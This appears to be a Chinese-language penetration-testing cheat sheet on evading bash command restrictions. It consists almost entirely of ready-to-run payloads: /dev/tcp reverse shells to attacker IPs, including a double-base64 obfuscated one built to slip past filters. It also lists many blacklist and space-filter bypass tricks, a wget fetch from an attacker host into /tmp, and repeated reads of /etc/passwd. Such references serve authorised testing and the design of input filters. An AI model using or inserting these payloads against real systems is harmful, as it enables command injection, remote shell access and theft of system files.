# 绕过bash命令限制

## 反向shell

```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'

echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

## 短小的 Rev Shell

```bash
(sh)0>/dev/tcp/10.10.10.10/443
exec >&0
```

## 绕过路径和黑名单

```bash
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
/usr/bin/who*mi # /usr/bin/whoami
/usr/bin/n[c] # /usr/bin/nc
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h # /bin/sh
who$@ami # whoami
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") # whoami -> 大写转小写
$(a="WhOaMi";printf %s "${a,,}") # whoami -> 转换 (仅限bash)
$(rev<<<'imaohw') # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) # base64
echo whoami|$0 # whoami
cat$u /etc$u/passwd$u # cat /etc/passwd
p${u}i${u}n${u}g # ping
p$(u)i$(u)n$(u)g # ping
w`u`h`u`o`u`a`u`m`u`i # whoami

通配符 + 本地目录参数
touch -- -la # 在 -- 之后停止处理选项
ls *
echo * # 使用echo和通配符列出当前文件和文件夹

使用历史记录连接字符串
!-1 # 将由最后执行的命令替换，!-2 由倒数第二个命令替换
mi # 抛出一个错误
whoa # 抛出一个错误
!-1!-2 # 执行whoami命令，由上面两条"命令"连接
```

## 空格绕过

```bash
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

将命令放入变量中执行
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b # wget
IFS=];b=cat]/etc/passwd;$b # cat /etc/passwd
IFS=,;`cat<<<cat,/etc/passwd`
echo${IFS}test

X=$'cat\x20/etc/passwd'&&$X
echo "ls\x09-l" | bash

换行
p\
i\
n\
g

未定义的变量和!
$u $u
uname!-1\-a
```
